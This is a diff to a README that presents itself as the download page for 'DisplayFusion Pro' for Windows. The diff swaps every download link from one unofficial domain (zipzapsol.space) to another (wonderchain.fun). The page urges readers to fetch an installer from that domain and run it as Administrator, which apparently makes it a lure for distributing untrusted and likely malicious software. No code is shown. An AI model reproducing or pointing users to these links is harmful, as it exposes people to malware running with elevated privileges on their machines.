@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **DisplayFusion Pro** for Windows.
 
 <p align="center">
-  <a href="https://displayfusion.zipzapsol.space/">
+  <a href="https://displayfusion.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-DisplayFusion%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download DisplayFusion Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[displayfusion.zipzapsol.space](https://displayfusion.zipzapsol.space/)** |
-| **Full URL** | `https://displayfusion.zipzapsol.space/` |
+| **Direct link** | **[displayfusion.wonderchain.fun](https://displayfusion.wonderchain.fun/)** |
+| **Full URL** | `https://displayfusion.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — displayfusion.zipzapsol.space](https://displayfusion.zipzapsol.space/)** (link above)
+1. Click **[Download — displayfusion.wonderchain.fun](https://displayfusion.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://displayfusion.zipzapsol.space/"><strong>⬇ Download DisplayFusion Pro now</strong></a></p>
+<p align="center"><a href="https://displayfusion.wonderchain.fun/"><strong>⬇ Download DisplayFusion Pro now</strong></a></p>
 
 ---
 
